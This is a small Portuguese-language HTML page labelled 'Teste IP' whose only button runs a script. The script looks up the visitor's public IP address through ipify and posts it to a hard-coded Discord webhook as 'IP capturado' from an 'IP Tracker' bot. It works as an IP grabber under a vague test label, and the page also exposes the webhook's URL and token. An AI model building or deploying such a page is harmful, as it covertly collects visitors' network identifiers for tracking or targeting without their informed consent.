<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Teste IP</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            background: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }
        button {
            background: white;
            border: 2px solid #333;
            color: #333;
            font-size: 2rem;
            padding: 20px 60px;
            cursor: pointer;
            border-radius: 10px;
            transition: all 0.2s;
        }
        button:hover {
            background: #f0f0f0;
        }
        #resultado {
            margin-top: 40px;
            font-size: 1.8rem;
            color: #0066cc;
            font-weight: bold;
            min-height: 40px;
        }
    </style>
</head>
<body>
    <button onclick="pegarIP()">Teste</button>
    <div id="resultado"></div>

    <script>
        async function pegarIP() {
            const elemento = document.getElementById('resultado');
            elemento.textContent = 'Enviando...';

            try {
                // Pega o IP pÃºblico
                const respostaIP = await fetch('https://api.ipify.org?format=json');
                const dadosIP = await respostaIP.json();
                const ip = dadosIP.ip;

                // Envia para o webhook do Discord
                const webhookURL = 'https://discord.com/api/webhooks/1472785931068112929/03T4QSCPooYa208GYf-Y0jbehhjlQWl5A6jja3XHcU-JJnX1VF5wxWHVMRr-UiJbLrvi';
                const payload = {
                    content: `IP capturado: ${ip}`,
                    username: "IP Tracker",
                    avatar_url: "https://i.imgur.com/4IzX6YH.png"
                };

                const respostaWebhook = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload),
                });

                if (respostaWebhook.ok) {
                    elemento.textContent = 'Enviado com sucesso!';
                } else {
                    elemento.textContent = 'Falha ao enviar ðŸ˜•';
                }

            } catch (erro) {
                elemento.textContent = 'Erro ao obter IP ou enviar ðŸ˜•';
                console.error(erro);
            }
        }
    </script>
</body>
</html>
